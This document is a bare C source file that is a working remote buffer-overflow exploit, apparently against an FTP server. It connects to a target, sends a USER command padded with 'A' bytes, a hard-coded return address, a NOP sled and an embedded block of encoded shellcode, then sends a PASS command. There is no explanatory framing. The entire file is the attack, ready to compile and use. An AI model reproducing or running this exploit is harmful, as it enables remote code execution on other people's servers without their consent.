#include <stdio.h>

#include <netinet/in.h>

#include <sys/socket.h>

#include <sys/types.h>

#include <netdb.h>

int main(int argc, char **argv)

{

struct sockaddr_in addr;

struct hostent *host;

char buffer[1109];

char buffer2[16];
int s, i;

if(argc != 3)

{

fprintf(stderr, "usage: %s <host> <port>\n", argv[0]);

exit(0);

}

s = socket(AF_INET, SOCK_STREAM, 0);

if(s == -1)

{

perror("socket() failed\n");

exit(0);

}

host = gethostbyname(argv[1]);

if( host == NULL)

{

herror("gethostbyname() failed");

exit(0);

}

addr.sin_addr = *(struct in_addr*)host->h_addr;

addr.sin_family = AF_INET;

addr.sin_port = htons(atol(argv[2]));

 

if(connect(s, &addr, sizeof(addr)) == -1)

{

perror("couldn't connect so server\n");

exit(0);

}
char buffRead[2048];
recv(s, buffRead, 2048, 0);
printf("%s\n", buffRead);
char shellcode[] = "\xd9\xcd\xbb\x7d\xda\x8e\x17\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x47\x31\x5a\x18\x03\x5a\x18\x83\xc2\x79\x38\x7b\xeb\x69\x3e"
"\x84\x14\x69\x5f\x0c\xf1\x58\x5f\x6a\x71\xca\x6f\xf8\xd7\xe6"
"\x04\xac\xc3\x7d\x68\x79\xe3\x36\xc7\x5f\xca\xc7\x74\xa3\x4d"
"\x4b\x87\xf0\xad\x72\x48\x05\xaf\xb3\xb5\xe4\xfd\x6c\xb1\x5b"
"\x12\x19\x8f\x67\x99\x51\x01\xe0\x7e\x21\x20\xc1\xd0\x3a\x7b"
"\xc1\xd3\xef\xf7\x48\xcc\xec\x32\x02\x67\xc6\xc9\x95\xa1\x17"
"\x31\x39\x8c\x98\xc0\x43\xc8\x1e\x3b\x36\x20\x5d\xc6\x41\xf7"
"\x1c\x1c\xc7\xec\x86\xd7\x7f\xc9\x37\x3b\x19\x9a\x3b\xf0\x6d"
"\xc4\x5f\x07\xa1\x7e\x5b\x8c\x44\x51\xea\xd6\x62\x75\xb7\x8d"
"\x0b\x2c\x1d\x63\x33\x2e\xfe\xdc\x91\x24\x12\x08\xa8\x66\x7a"
"\xfd\x81\x98\x7a\x69\x91\xeb\x48\x36\x09\x64\xe0\xbf\x97\x73"
"\x07\xea\x60\xeb\xf6\x15\x91\x25\x3c\x41\xc1\x5d\x95\xea\x8a"
"\x9d\x1a\x3f\x1c\xce\xb4\x90\xdd\xbe\x74\x41\xb6\xd4\x7b\xbe"
"\xa6\xd6\x56\xd7\x4d\x2c\x30\xd2\xb4\x07\xcd\x8a\xb4\x57\xdc"
"\x16\x30\xb1\xb4\xb6\x14\x69\x20\x2e\x3d\xe1\xd1\xaf\xeb\x8f"
"\xd1\x24\x18\x6f\x9f\xcc\x55\x63\x77\x3d\x20\xd9\xd1\x42\x9e"
"\x74\xdd\xd6\x25\xdf\x8a\x4e\x24\x06\xfc\xd0\xd7\x6d\x77\xd8"
"\x4d\xce\xef\x25\x82\xce\xef\x73\xc8\xce\x87\x23\xa8\x9c\xb2"
"\x2b\x65\xb1\x6f\xbe\x86\xe0\xdc\x69\xef\x0e\x3b\x5d\xb0\xf1"
"\x6e\x5f\x8c\x27\x56\x15\xfc\xfb";


buffer[0] = 'U';
buffer[1] = 'S';
buffer[2] = 'E';
buffer[3] = 'R';
buffer[4] = ' ';

for(i = 5; i < 490 ; i++)

buffer[i] = 'A';

buffer[490] = '\xD7';
buffer[491] = '\x30';
buffer[492] = '\x9D';
buffer[493] = '\x7C';
buffer[494] = 'C';
buffer[495] = 'C';
buffer[496] = 'C';
buffer[497] = 'C';
for (i = 498; i < 793; i++)

buffer[i] = '\x90';

for (i = 0; i < 308; i++)

buffer[i+793] = shellcode[i];

buffer[1101] = '\r';
buffer[1102] = '\n';
buffer[1103] = '\0';
printf("buffer is: %s\n", buffer);

send(s, buffer, strlen(buffer), 0);
recv(s, buffRead, 2048, 0);
printf("%s\n", buffRead);

buffer2[0] = 'P';
buffer2[1] = 'A';
buffer2[2] = 'S';
buffer2[3] = 'S';
buffer2[4] = ' ';
buffer2[5] = 'P';
buffer2[6] = 'A';
buffer2[7] = 'S';
buffer2[8] = 'S';
buffer2[9] = 'W';
buffer2[10] = 'O';
buffer2[11] = 'R';
buffer2[12] = 'D';
buffer2[13] = '\r';
buffer2[14] = '\n';
buffer2[15] = '\0';
send(s, buffer2, strlen(buffer2), 0);
recv(s, buffRead, 2048, 0);
printf("%s\n", buffRead);
close(s);

return 0;

}
